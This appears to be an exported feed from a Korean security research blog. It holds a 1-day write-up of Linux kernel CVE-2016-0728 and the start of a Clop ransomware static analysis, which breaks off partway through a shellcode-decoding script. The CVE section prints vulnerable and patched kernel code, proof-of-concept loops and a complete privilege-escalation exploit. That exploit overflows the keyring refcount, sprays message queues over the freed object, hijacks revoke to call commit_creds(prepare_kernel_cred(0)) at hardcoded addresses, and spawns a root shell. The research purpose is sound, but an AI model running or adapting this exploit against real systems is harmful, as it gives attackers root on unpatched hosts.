<h3 id="find-keyring-by-name"><a href="#find-keyring-by-name" class="headerlink" title="find_keyring_by_name"></a>find_keyring_by_name</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct key *<span class="title">find_keyring_by_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> skip_perm_check)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">int</span> bucket;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!name)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	bucket = keyring_hash(name);</span><br><span class="line"></span><br><span class="line">	read_lock(&amp;keyring_name_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (keyring_name_hash[bucket].next) &#123;</span><br><span class="line">		<span class="comment">/* search this hash bucket for a keyring with a matching name</span></span><br><span class="line"><span class="comment">		 * that&#x27;s readable and that hasn&#x27;t been revoked */</span></span><br><span class="line">		list_for_each_entry(keyring,</span><br><span class="line">				    &amp;keyring_name_hash[bucket],</span><br><span class="line">				    type_data.link</span><br><span class="line">				    ) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!kuid_has_mapping(current_user_ns(), keyring-&gt;user-&gt;uid))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (test_bit(KEY_FLAG_REVOKED, &amp;keyring-&gt;flags))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(keyring-&gt;description, name) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!skip_perm_check &amp;&amp;</span><br><span class="line">			    key_permission(make_key_ref(keyring, <span class="number">0</span>),</span><br><span class="line">					   KEY_NEED_SEARCH) &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* we&#x27;ve got a match but we might end up racing with</span></span><br><span class="line"><span class="comment">			 * key_cleanup() if the keyring is currently &#x27;dead&#x27;</span></span><br><span class="line"><span class="comment">			 * (ie. it has a zero usage count) */</span></span><br><span class="line">			<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;keyring-&gt;usage))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			keyring-&gt;last_used_at = current_kernel_time().tv_sec;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	keyring = ERR_PTR(-ENOKEY);</span><br><span class="line">out:</span><br><span class="line">	read_unlock(&amp;keyring_name_lock);</span><br><span class="line">	<span class="keyword">return</span> keyring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>find_keyring_by_name 함수는 list를 돌아가며 같은 이름의 keyring이 있는지 찾아준다.</li>
<li>여기서 같은 이름이 있다면 마지막 부분에 atomic_inc_not_zero(&amp;keyring-&gt;usage)를 호출한다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * atomic_inc_not_zero - increment unless the number is zero</span></span><br><span class="line"><span class="comment"> * @v: pointer of type atomic_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Atomically increments @v by 1, so long as @v is non-zero.</span></span><br><span class="line"><span class="comment"> * Returns non-zero if @v was non-zero, and zero otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> atomic_inc_not_zero</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_inc_not_zero(v)		atomic_add_unless((v), 1, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>atomic_inc_not_zero(&amp;keyring-&gt;usage)는 keyring-&gt;usage가 0이 아니면 증가시킨다.</li>
<li>여기서 증가된 keyring-&gt;usage는 반드시 key_put을 통해 감소시켜야 하는데, 감소시키는 부분이 존재하지 않음을 확인할 수 있다.</li>
<li>keyring-&gt;usage는 atomic_t == int형 이므로, 계속 증가시킨다면 Integer OverFlow를 발생시킬 수 있다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">	key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>패치된 코드를 보면, goto error2로 가기 전에 key_put(keyring)을 통해 증가된 keyring-&gt;usage를 감소시키는 것을 확인할 수 있다.</li>
<li>이를 통해 Integer OverFlow를 막을 수 있다.</li>
</ul>
<h2 id="poc-code"><a href="#poc-code" class="headerlink" title="poc code"></a>poc code</h2><ul>
<li>취약점을 증명하기 위한 PoC코드는 다음과 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>먼저 “TestSession”이라는 name의 keyring을 만들고, 다시 한 번 같은 이름의 keyring을 만든다.</li>
<li>keyctl_join_session_keyring은 find_keyring_by_name를 호출 할 것이며 이를 통해 keyring-&gt;usage는 계속 증가할 것이다.</li>
<li>keyring의 정보는 /proc/keys에서 확인 할 수 있다.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/98797011-6165a600-244f-11eb-9955-a46887866a07.png" alt="334"></p>
<ul>
<li>위와 같이 “TestSession”의 refcount가 계속 증가하는 것을  확인할 수 있다.</li>
<li>만약 0xffffffff(2^32)번 만큼 실행을 시킨다면, Integer OverFlow를 통하여 refcount를 0으로 초기화 시킬 수 있을 것이다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>keyctl(KEYCTL_JOIN_SESSION_KEYRING,”TestSession”)을 2^32번 반복한 후, /proc/keys를 확인한다.</li>
</ul>
<h2 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h2><ol>
<li>Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.</li>
<li>해당 Keyring 오브젝트의 Usage를 Overflow 시킨다.</li>
<li>Keyring 오브젝트를 free시킨다. </li>
<li>user space에서 이미 free된 keyring 공간에 새로운 커널 오브젝트를 할당한다.</li>
<li>이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.</li>
</ol>
<ul>
<li>exploit의 핵심 함수는 key_revoke()이다.</li>
</ul>
<h3 id="key-revoke"><a href="#key-revoke" class="headerlink" title="key_revoke()"></a>key_revoke()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">time64_t</span> time;</span><br><span class="line">	key_check(key);</span><br><span class="line">	<span class="comment">/* make sure no one&#x27;s trying to change or use the key when we mark it</span></span><br><span class="line"><span class="comment">	 * - we tell lockdep that we might nest because we might be revoking an</span></span><br><span class="line"><span class="comment">	 *   authorisation key whilst holding the sem on a key we&#x27;ve just</span></span><br><span class="line"><span class="comment">	 *   instantiated</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	down_write_nested(&amp;key-&gt;sem, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">	    key-&gt;type-&gt;revoke)</span><br><span class="line">		key-&gt;type-&gt;revoke(key); </span><br><span class="line">	<span class="comment">/* set the death time to no more than the expiry time */</span></span><br><span class="line">	time = ktime_get_real_seconds();</span><br><span class="line">	<span class="keyword">if</span> (key-&gt;revoked_at == <span class="number">0</span> || key-&gt;revoked_at &gt; time) &#123;</span><br><span class="line">		key-&gt;revoked_at = time;</span><br><span class="line">		key_schedule_gc(key-&gt;revoked_at + key_gc_delay);</span><br><span class="line">	&#125;</span><br><span class="line">	up_write(&amp;key-&gt;sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>key_revoke()에서 key-&gt;type-&gt;revoke(key)를 호출한다. </li>
<li>여기서 revoke는 key_type구조체에 있는 멤버이며, 함수 포인터이다.</li>
<li>즉, revoke를 우리가 원하는 함수의 주소로 덮어쓴 후 호출시킬수 있다.</li>
<li>revoke부분을 commit_creds(prepare_kernel_cred(0))가 호출되도록 덮어야 한다.</li>
<li>prepare_kernel_cred(0)을 호출,  root의 권한의 task를 가지고 commit_creds를 실행하기 때문에 현재 프로세스의 권한이 root가 되기 때문이다.</li>
</ul>
<h2 id="exploit-method"><a href="#exploit-method" class="headerlink" title="exploit method"></a>exploit method</h2><ul>
<li>user space에서 가짜 key_type을 만든다.</li>
<li>key_revoke가 실행될 때 root권한을 얻을 수 있도록 key_type-&gt;revoke에 commit_creds(prepare_kernel_cred(0))주소를 넣는다.</li>
<li>메세지 큐를 생성하고, 이때 이전에 free된 keyring의 위치가 재사용 된다.</li>
<li>메세지 큐를 이용해 keyring에 맞게 가짜 key_type을 전달한다.</li>
<li>keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING)를 호출한다.</li>
<li>key-&gt;type-&gt;revoke = commit_creds(prepare_kernel_cred(0))가 실행되어 root권한을 획득한다.</li>
<li>execl(“/bin/sh”, “/bin/sh”, NULL)을 호출하여 쉘을 획득한다.</li>
</ul>
<h2 id="exploit-Code"><a href="#exploit-Code" class="headerlink" title="exploit Code"></a>exploit Code</h2><ul>
<li>최종 exploit code는 다음과 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line">	<span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">		<span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">	&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">	<span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">	<span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/70257118/99533180-d2c1cd80-29e8-11eb-9a4d-35319be58303.png" alt="CVE-2016-0728"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f</a></li>
<li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a></li>
<li><a href="https://duasynt.com/blog/cve-2016-0728-poc-not-working">https://duasynt.com/blog/cve-2016-0728-poc-not-working</a></li>
<li><a href="https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/">https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</a></li>
<li><a href="http://egloos.zum.com/rousalome/v/9964885">http://egloos.zum.com/rousalome/v/9964885</a></li>
<li><a href="https://procdiaru.tistory.com/89">https://procdiaru.tistory.com/89</a></li>
<li><a href="http://blog.naver.com/skinfosec2000/220612669396">http://blog.naver.com/skinfosec2000/220612669396</a></li>
<li><a href="https://asiagaming.tistory.com/160">https://asiagaming.tistory.com/160</a></li>
</ul>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>1-day</tag>
        <tag>UAF</tag>
        <tag>CVE</tag>
        <tag>Linux Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Clop Ransomware</title>
    <url>/2021/05/24/2021-05-25-Clop/</url>
    <content><![CDATA[<center>Clop // Ransomware</center> 


<h1 id="File-info"><a href="#File-info" class="headerlink" title="File info"></a>File info</h1><table>
<thead>
<tr>
<th align="center">Info</th>
<th align="center">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SHA256</td>
<td align="center">3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b</td>
</tr>
<tr>
<td align="center">File Size</td>
<td align="center">183KB</td>
</tr>
<tr>
<td align="center">File Type</td>
<td align="center">.exe(win32)</td>
</tr>
<tr>
<td align="center">Function</td>
<td align="center">Crypto</td>
</tr>
</tbody></table>
<span id="more"></span>
<h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><h3 id="분석환경"><a href="#분석환경" class="headerlink" title="분석환경"></a>분석환경</h3><ul>
<li>OS : Windows10</li>
<li>Tools : IDA Pro, 010Editor</li>
</ul>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><img src="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png" alt="그림1"></p>
<p>Clop Sample을 다운 받은 후 IDA로 확인했을때의 모습이다. 바이너리가 호출하는 함수의 개수가 적은 것으로 보아 바로 악성행위를 분석할 수 있을 것 같지 않다.  <code>Line115</code>에서 for문을 500000번을 도는데 이는 단순히 동적 분석을 방해하는 fake코드 인 것 같다. 해당 루프를 탈출하면 <code>Line140</code>의 조건문으로 들어가게 된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png" alt="그림2"></p>
<p>조건문안에는 쓰이지 않는 값들을 변수에 할당해주며 마지막에 <code>401000()</code>을 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png" alt="그림3"></p>
<p><code>401000()</code>에서는 <code>VirtualAlloc</code>을 통해 메모리를 할당하게 되는데 빨간 박스 부분에서 할당한 메모리에 값을 쓰게된다. 여기서 <code>Line 176, 183, 185</code>가 연산에 쓰이는 핵심 코드이며 나머지는 쓰레기 코드이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png" alt="그림4"></p>
<p>위 과정에서 입력한 내용을 <code>Line232</code>에서 호출하는 것으로 보아, 다음 단계로 넘어가기 위해 <code>Shellcode</code>를 쓰고 호출하는 것을 예상할 수 있다.  내용을 입력할 때 사용한 코드를 아래와 같이 python으로 똑같이 구현하여 쉘코드를 추출할 수 있었다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clop&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x933C</span>)</span><br><span class="line">    shellcode = f.read(<span class="number">1380</span>*<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span 